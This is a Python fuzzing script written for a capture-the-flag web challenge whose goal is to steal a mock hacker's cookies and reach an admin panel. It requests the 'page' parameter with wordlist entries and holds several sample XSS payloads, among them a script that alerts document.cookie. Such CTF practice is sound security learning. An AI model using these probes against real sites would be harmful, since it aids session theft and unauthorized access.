''' https://www.laptophackingcoffee.org/CTF/
http://ctf.laptophackingcoffee.org:1337/dev.php
http://ctf.laptophackingcoffee.org:1337/dev.php?page=admin

[Cookie Monster] - 200 points
A skid hacker who's out to get me is working on a forum. Right now the only accessable page is http://ctf.laptophackingcoffee.org:1337/dev.php.
We've found his admin panel at http://ctf.laptophackingcoffee.org:1337/dev.php?page=admin but we don't know what cookies we need to access it.
Steal his cookies and access the admin panel to delete the site.

He's on the LHC discord server as @Elite Hacker#7750, message him telling him that "Jerry" sent you, and he'll open any links you send him.

'''

import requests, time, urllib.parse
from pprint import pprint

url_list = ['http://ctf.laptophackingcoffee.org:1337/dev.php?page=']
            # 'http://ctf.laptophackingcoffee.org:1337/dev.php?page=admin%20',
            # 'http://ctf.laptophackingcoffee.org:1337/dev.php?page=admin',
            # 'http://ctf.laptophackingcoffee.org:1337/dev.php?page=admin+',
            # 'http://ctf.laptophackingcoffee.org:1337/dev.php?page=admin&']



fuzzlist = 'fuzz.txt'


post_data = {'message': 'alert()'}
post_data = {'message': '<script> alert(1); </script>'}
post_data = {'message': '<script type="text/javascript">document.cookie = "username=Null Byte";</script>'}
post_data = {'message': '"<script>alert(document.cookie)</script>'}
# r = requests.get(url, data=post_data)

results = []

with open(fuzzlist) as fl:
    fuzz_lines = fl.read().splitlines()

for url in url_list:
    for fuzz in fuzz_lines:
        for encode in (False, True):
            if encode:
                fuzz = urllib.parse.quote(fuzz)
            urlfuzz = url + fuzz
            # print(urlfuzz)
            start_time = time.perf_counter()
            r = requests.get(urlfuzz)
            finish_time = time.perf_counter()
            request_time = finish_time - start_time
            print("time: {:.6f}".format(request_time), urlfuzz)
            if r.content != b'H4X1N6 F0RU|V| D3\\/\n<br>\n<br>\n<br>\n<form action="/dev.php" method="post">\n  Message: <input type="text" name="message"><br>\n  <input type="submit" value="Submit">\n</form> \n' and r.content != b'H4X1N6 F0RU|V| D3\\/\n<br>\n<br>\n':
                results.append([request_time, urlfuzz, r])
                # print(urlfuzz)
                # print(r, r.content)

if len(results) > 0:
    print('Results:')
for result in results:
    pprint(result)
                

# print(r.ok)
# print(dir(r))
# print(r.headers)
